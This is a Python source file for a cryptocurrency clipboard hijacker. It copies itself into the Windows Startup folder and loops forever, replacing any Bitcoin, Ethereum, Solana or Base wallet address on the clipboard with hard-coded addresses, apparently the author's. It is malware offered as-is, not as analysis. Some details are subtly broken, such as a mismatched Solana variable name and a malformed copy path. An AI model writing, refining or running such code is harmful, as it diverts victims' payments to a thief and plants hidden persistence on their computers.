import pyperclip as pc
import time
import re
import time
import os
import shutil

BTC_address = "bc1qcdpk4m36z669z9m9s0m9vykvssw24x20pmaztp"
ETH_address = "0x6202B62B85FC049FE3fEF02F6767D9c96d844A63"
SOl_address  = "JCm3HWkEykKUZteGSvnNeewTKuLvaxYx9NCamkiK7Y9n"
BASE_address = "0x6202B62B85FC049FE3fEF02F6767D9c96d844A63"

def add_to_startup():
    user = os.getlogin()
    basename = os.path.basename(__file__)
    shutil.copy(os.getcwd() + basename,'C:/Users/'+user+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')

add_to_startup()

def clip():
    s = str(pc.paste())
    length_of_s = len(s)
    btc_check = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", s)
    btc_match = bool(btc_check)
    eth_check = re.match("^0x[a-zA-F0-9]{40}$", s)
    eth_match = bool(eth_check)
    sol_check = re.match(r"^[1-9A-HJ-NP-Za-km-z]{32,44}$", s)
    sol_match = bool(sol_check)
    base_check = re.match(r"^0x[a-fA-F0-9]{40}$", s)
    base_match = bool(base_check)
    wallet_check = ""
    time.sleep(0.25)
    if btc_match == True:
        pc.copy(BTC_address)
    elif eth_match == True:
        pc.copy(ETH_address)
    elif sol_match == True:
        pc.copy(SOL_address)
    elif base_match == True:
        pc.copy(BASE_address)
    else:
        wallet_check = "ignore"


while True:
    clip()
